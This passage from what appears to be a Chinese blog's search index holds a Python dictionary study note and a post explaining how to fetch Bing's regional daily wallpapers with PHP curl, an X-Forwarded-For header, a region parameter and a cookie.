方法以避免访问不存在的key时抛出异常，以None取代之</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictA.get(<span class="string">&#x27;A&#x27;</span>) <span class="comment">#This will be 1</span></span><br><span class="line">dictA.get(<span class="string">&#x27;C&#x27;</span>) <span class="comment">#This will be None</span></span><br></pre></td></tr></table></figure><h5 id="γ-更新字典"><a href="#γ-更新字典" class="headerlink" title="γ. 更新字典"></a>γ. 更新字典</h5><p> 使用 <span style="font-family:Consolas">update</span> 方法使用一个字典更新另一个字典（更新并合并）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictB = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;C&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">dictA.update(dictB)</span><br><span class="line"><span class="comment">#dictA will be &#123;&#x27;A&#x27;:2,&#x27;B&#x27;:2,&#x27;C&#x27;:3&#125;</span></span><br></pre></td></tr></table></figure><p>使用 <span style="font-family:Consolas">setdefault</span> 方法来合并（不更新）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictA.setdefault(<span class="string">&#x27;A&#x27;</span>,<span class="number">2</span>) <span class="comment">#dictA will still be &#123;&#x27;A&#x27;:1,&#x27;B&#x27;:2&#125;</span></span><br><span class="line">dictA.setdefault(<span class="string">&#x27;C&#x27;</span>,<span class="number">3</span>) <span class="comment">#dictA will be &#123;&#x27;A&#x27;:1,&#x27;B&#x27;:2,&#x27;C&#x27;:3&#125;</span></span><br></pre></td></tr></table></figure><h5 id="θ-元素存在性判断"><a href="#θ-元素存在性判断" class="headerlink" title="θ. 元素存在性判断"></a>θ. 元素存在性判断</h5><p>使用 <span style="font-family:Consolas">in/not in</span> 来对key进行查询，根据返回的结果进行判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span> <span class="keyword">in</span> dictA) <span class="comment">#This will be True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> dictA) <span class="comment">#This will be False</span></span><br></pre></td></tr></table></figure><h5 id="δ-字典格式化输出"><a href="#δ-字典格式化输出" class="headerlink" title="δ. 字典格式化输出"></a>δ. 字典格式化输出</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">template = <span class="string">&#x27;%(A)d,is not %(B)d&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(template % dictA) <span class="comment">#This will be 1 is not 2</span></span><br></pre></td></tr></table></figure><h4 id="4-2-α-Attentions"><a href="#4-2-α-Attentions" class="headerlink" title="[4.2.α] !Attentions"></a>[4.2.α] !Attentions</h4><p>以下值等同于False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span> <span class="number">0</span> () <span class="string">&quot;&quot;</span> [] &#123;&#125;</span><br></pre></td></tr></table></figure><p>空语句使用pass实现</p><p>当断言为False时会引发错误</p><p>for-in 循环中的变量不应该在循环内更改值(foreach?)</p>]]></content>
      
      
      <categories>
          
          <category> StudyNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓取各地区Bing搜索首页的背景图</title>
      <link href="/zh-CN/posts/87aca34b.html"/>
      <url>/zh-CN/posts/87aca34b.html</url>
      
        <content type="html"><![CDATA[<h4 id="Bing的限定"><a href="#Bing的限定" class="headerlink" title="Bing的限定"></a>Bing的限定</h4><p>不知道什么时候开始，单单依靠原来的修改 GET 请求的参数 cc 来获取Bing搜索每日在不同地区展示的背景图片行不通了。 <span class="heimu" title="你发现了！！:)">可能是聪明的Bing识破了大家抓它壁纸的套路</span> 于是我细细地研究了一下它的新套路。</p><p><escape><span id="more"></span></escape></p><h4 id="构造Header"><a href="#构造Header" class="headerlink" title="构造Header"></a>构造Header</h4><p>在原来的 Header 中加入了这样一行 <span style="color:blue">X-Forwarded-For:64.233.161.2</span> <span class="heimu" title="你发现了！！:)">以混淆视听（不是）</span> 之后，得到了这样一个返回结果</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;images&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;startdate&quot;</span>: <span class="string">&quot;20191215&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;fullstartdate&quot;</span>: <span class="string">&quot;201912150800&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;enddate&quot;</span>: <span class="string">&quot;20191216&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/th?id=OHR.NutsWeekend_EN-US5701415684_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;urlbase&quot;</span>: <span class="string">&quot;/th?id=OHR.NutsWeekend_EN-US5701415684&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;copyright&quot;</span>: <span class="string">&quot;Beech forest covered with frost and snow, Ardennes, Belgium (© Philippe Moes/Alamy)&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;copyrightlink&quot;</span>: <span class="string">&quot;https://www.bing.com/search?q=battle+of+the+bulge&amp;form=hpcapt&amp;filters=HpDate%3a%2220191215_0800%22&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;The Battle of the Bulge 75 years later&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;quiz&quot;</span>: <span class="string">&quot;/search?q=Bing+homepage+quiz&amp;filters=WQOskey:%22HPQuiz_20191215_NutsWeekend%22&amp;FORM=HPQUIZ&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;wp&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;hsh&quot;</span>: <span class="string">&quot;a17e8b7d1284b2d4edb74483be0d8f43&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;drk&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;top&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;bot&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;hs&quot;</span>: [</span><br><span class="line">                </span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">   ......</span><br></pre></td></tr></table></figure><h4 id="修正请求链接"><a href="#修正请求链接" class="headerlink" title="修正请求链接"></a>修正请求链接</h4><p>注意到返回的 UrlBase 中有这样一个标记  <span style="color:blue">EN-US</span> ，于是我在原本的请求链接后带上了原来的 <span style="font-family:Consolas">cc</span> 参数</p><p>得到了这样的返回结果</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;images&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;startdate&quot;</span>: <span class="string">&quot;20191214&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;fullstartdate&quot;</span>: <span class="string">&quot;201912141500&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;enddate&quot;</span>: <span class="string">&quot;20191215&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/th?id=OHR.TrilliumLake_JA-JP3615984347_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;urlbase&quot;</span>: <span class="string">&quot;/th?id=OHR.TrilliumLake_JA-JP3615984347&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;copyright&quot;</span>: <span class="string">&quot;｢トリリアム湖とフッド山」米国オレゴン州, マウントフッド国立森林 (© Frank Krahmer/Getty Images)&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;copyrightlink&quot;</span>: <span class="string">&quot;https://www.bing.com/search?q=%E3%83%95%E3%83%83%E3%83%89%E5%B1%B1&amp;form=hpcapt&amp;filters=HpDate%3a%2220191214_1500%22&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;オレゴン州の静かな湖&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;quiz&quot;</span>: <span class="string">&quot;/search?q=Bing+homepage+quiz&amp;filters=WQOskey:%22HPQuiz_20191214_TrilliumLake%22&amp;FORM=HPQUIZ&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;wp&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;hsh&quot;</span>: <span class="string">&quot;6d2a3791c51a549d64928ee8d2dc7346&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;drk&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;top&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;bot&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;hs&quot;</span>: [</span><br><span class="line">                </span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>至此，得到的结果达到了预期</p><h4 id="Cookies的附加"><a href="#Cookies的附加" class="headerlink" title="Cookies的附加"></a><del>Cookies的附加</del></h4><p>其实一开始请求的时候是无法得到 title 的，后来看了看，是因为少了这样一行 Cookies: <span style="color:blue">ENSEARCH=<span style="color:brown">BENVER=1</span></span>，把它加上之后就得到了带有 title 的结果。</p><h4 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h4><p>首先根据思路找出两种不一样的请求构造。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl_setopt(<span class="variable">$objCurl</span>,CURLOPT_URL,<span class="string">&quot;http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=&quot;</span>.<span class="variable">$idx</span>.<span class="string">&quot;&amp;n=1&amp;ensearch=0&quot;</span>);</span><br><span class="line">curl_setopt(<span class="variable">$objCurl</span>,CURLOPT_URL,<span class="string">&quot;http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=&quot;</span>.<span class="variable">$idx</span>.<span class="string">&quot;&amp;n=1&amp;cc=&quot;</span>.<span class="variable">$region</span>);</span><br></pre></td></tr></table></figure><p>然后构造Header，设定相应的 <code>X-Forwarded-For</code> 值，然后设定 Cookie 为 <code>ENSEARCH=BENVER=1</code>。</p><p>同时，为了满足各种请求需要，我给出了四个请求参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$idx</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;idx&quot;</span>])?htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;idx&quot;</span>]):<span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="variable">$region</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;region&quot;</span>])?htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;region&quot;</span>]):<span class="string">&quot;cn&quot;</span>;</span><br><span class="line"><span class="variable">$resolution</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;resolution&quot;</span>])?htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;resolution&quot;</span>]):<span class="string">&quot;1920x1080&quot;</span>;</span><br><span class="line"><span class="variable">$swiftSwap</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ss&quot;</span>])?htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;ss&quot;</span>]):<span class="string">&quot;0&quot;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数名称</th><th align="left">必填</th><th align="left">类型</th><th align="left">说明</th><th>默认值</th></tr></thead><tbody><tr><td align="left">idx</td><td align="left">否</td><td align="left">int</td><td align="left">图片展示距今天数</td><td>0</td></tr><tr><td align="left">region</td><td align="left">否</td><td align="left">string</td><td align="left">获取图片所展示地区</td><td>cn</td></tr><tr><td align="left">resolution</td><td align="left">否</td><td align="left">string</td><td align="left">获取图片的分辨率</td><td>1920x1080</td></tr><tr><td align="left">ss</td><td align="left">否</td><td align="left">int</td><td align="left">快速跳转 参照文章中的代码</td><td>0</td></tr></tbody></table><p>其中的 <code>ss</code> 为 0 时，接口会返回详细信息；为 1 时，接口将只返回图片的链接；为 3 时，接口将直接跳转到相应图片的页面。</p><p>接下来要做的就是发起请求并整理返回值，并且加入一点点细节。</p><hr><a class="button is-light is-small" href="https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr@0d71d4e1459695e52740f765018d3f2a7cfcaa07/source/phpAPI_BingWallpaperFetch_0.3.0.1.php"><span>Download Source</span></a>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
